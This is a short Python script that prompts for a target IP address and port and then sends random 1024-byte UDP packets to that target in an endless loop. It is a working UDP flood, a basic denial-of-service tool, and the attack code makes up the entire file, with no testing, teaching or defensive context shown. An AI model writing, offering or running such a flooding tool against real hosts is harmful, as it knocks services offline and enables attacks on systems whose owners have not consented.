import socket
import random

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random data to send
def generate_random_data(size):
    return bytearray(random.getrandbits(8) for _ in range(size))

# Prompt for IP and Port
target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port number: "))

# Send a flood of packets to the target
while True:
    sock.sendto(generate_random_data(1024), (target_ip, target_port))
